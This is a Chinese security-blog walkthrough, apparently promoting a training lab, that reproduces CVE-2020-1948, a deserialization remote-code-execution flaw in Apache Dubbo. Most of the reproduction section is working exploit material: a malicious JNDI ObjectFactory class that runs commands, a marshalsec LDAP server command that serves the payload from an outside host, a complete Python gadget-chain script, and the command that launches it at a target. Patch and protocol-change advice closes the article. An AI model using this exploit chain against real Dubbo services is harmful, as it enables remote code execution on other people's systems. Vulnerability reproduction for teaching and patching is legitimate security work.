\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/8pYHhvTqOLnh73uA5sKrpQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif)

亲爱的, 关注我吧

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif)

**11/18**

本文字数 1524

看完文章之后

留几分钟点击阅读原文看看同款实验

来和我一起阅读吧

```
本文涉及靶场同款知识点练习
CVE-2020-1948 Apache dubbo远程命令执行漏洞 
https://www.hetianlab.com/expc.do?w=exp\_ass&ec=ECID39ef-c0db-4835-b19f-62f9d8d70d55&pk\_campaign=weixin-wemedia
通过该实验了解漏洞产生的原因，掌握基本的漏洞利用及使用方法，并能给出加固方案。
```

**简介**

Dubbo 是阿里巴巴公司开源的一个高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring 框架无缝集成。它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。

**概述**

2020 年 06 月 23 日， Apache Dubbo 官方发布了 Apache Dubbo 远程代码执行的风险通告，该漏洞编号为 CVE-2020-1948，漏洞等级：高危。

Apache Dubbo 是一款高性能、轻量级的开源 Java RPC 框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。

Apache Dubbo Provider 存在反序列化漏洞，攻击者可以通过 RPC 请求发送无法识别的服务名称或方法名称以及一些恶意参数有效载荷，当恶意参数被反序列化时，可以造成远程代码执行。

**影响版本**

```
Dubbo 2.7.0 - 2.7.6
   Dubbo 2.6.0 - 2.6.7
   Dubbo 2.5.x （官方不再维护）
```

**环境搭建**

运行环境与编译 exp 环境 jdk 版本均为 8u121，启动测试环境

```
https://github.com/DSO-Lab/defvul/wiki/Apache-Dubbo-CVE\_2020\_1948-Deserialization-Vulnerability
```

启动后会监听 12345 端口

**漏洞复现**

服务指纹：

```
PORT      STATE SERVICE VERSION
12345/tcp open  textui  Alibaba Dubbo remoting telnetd
```

构造 poc，我们这里执行一个 ping 命令来验证是否可以执行命令，新建 calc.java，  

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class calc implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("ping test.sr3uwk.ceye.io");
        return null;
    }
}
```

编译 poc

```
javac calc.java
```

将编译好的 poc（calc.class）放到 web 网站目录里，确保漏洞主机可以访问到

使用 marshalsec 项目启动一个 ldap 代理服务，marshalsec 下载

```
https://github.com/RandomRobbieBF/marshalsec-jar/raw/master/marshalsec-0.0.3-SNAPSHOT-all.jar
```

启动 LDAP 代理服务，执行该命令 ldap 服务会监听 8086 端口  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://139.9.198.30/#calc 8086
```

执行测试脚本，此处测试使用 python 环境为 3.8.0，先安装依赖包  

```
python3 -m pip install dubbo-py
```

脚本内容 (Dubbo.py)：

```
# -\*- coding: utf-8 -\*-

import sys

from dubbo.codec.hessian2 import Decoder,new\_object
from dubbo.client import DubboClient

if len(sys.argv) < 4:
  print('Usage: python {} DUBBO\_HOST DUBBO\_PORT LDAP\_URL'.format(sys.argv\[0\]))
  print('\\nExample:\\n\\n- python {} 1.1.1.1 12345 ldap://1.1.1.6:80/exp'.format(sys.argv\[0\]))
  sys.exit()

client = DubboClient(sys.argv\[1\], int(sys.argv\[2\]))

JdbcRowSetImpl=new\_object(
  'com.sun.rowset.JdbcRowSetImpl',
  dataSource=sys.argv\[3\],
  strMatchColumns=\["foo"\]
  )
JdbcRowSetImplClass=new\_object(
  'java.lang.Class',
  ,
  )
toStringBean=new\_object(
  'com.rometools.rome.feed.impl.ToStringBean',
  beanClass=JdbcRowSetImplClass,
  obj=JdbcRowSetImpl
  )

resp = client.send\_request\_and\_return\_response(
  service\_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',
  # 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。
  method\_name='$invoke',
  args=\[toStringBean\])

output = str(resp)
if 'Fail to decode request due to: RpcInvocation' in output:
  print('\[!\] Target maybe not support deserialization.')
elif 'EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()' in output:
   print('\[+\] Succeed.')
else:
  print('\[!\] Output:')
  print(output)
  print('\[!\] Target maybe not use dubbo-remoting library.')
```

执行脚本

```
python3 Dubbo.py 192.168.137.173 12345 ldap://139.9.198.30:8086/calc
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LclPHVlUpvRtV4U7PUOHMeaq828vBCqZICibjH8SFlujib76ayhlD5apIZy1qmoOvcauSsqhUAJpEEA/640?wx_fmt=png)

dnslog 查看，成功接收到请求

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LclPHVlUpvRtV4U7PUOHMeakNjBNuSXBibvXyM2GL2IbZDBwDB96esXhY3wUkGUIuIFn61BQExMq5g/640?wx_fmt=png)

ldap 服务也可以看到请求转发

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LclPHVlUpvRtV4U7PUOHMeatPicOXiaRIrjxlVpWF05QsicViboxwqCFgAzGFcr0mku6uPnfHicOmkFxDg/640?wx_fmt=png)

弹计算器

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class calc implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
}
```

**漏洞修复**

升级 2.7.7 版本，并根据以下链接的方法进行参数校验

```
https://github.com/apache/dubbo/pull/6374/commits/8fcdca112744d2cb98b349225a4aab365af563de
```

更换协议以及反序列化方式。具体更换方法可参考：  

```
http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html
```

**参考**  

```
https://github.com/DSO-Lab/defvul/wiki/Apache-Dubbo-CVE\_2020\_1948-Deserialization-Vulnerability
```

**11/18**

欢迎投稿至邮箱：**EDU@antvsion.com**  

有才能的你快来投稿吧！

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDH643dgKUQ7JK7bkJibUEk8bImjXrQgvtr4MZpMnfVuw7aT2KRkdFJrw/640?wx_fmt=gif)

快戳 “阅读原文” 做同款实验！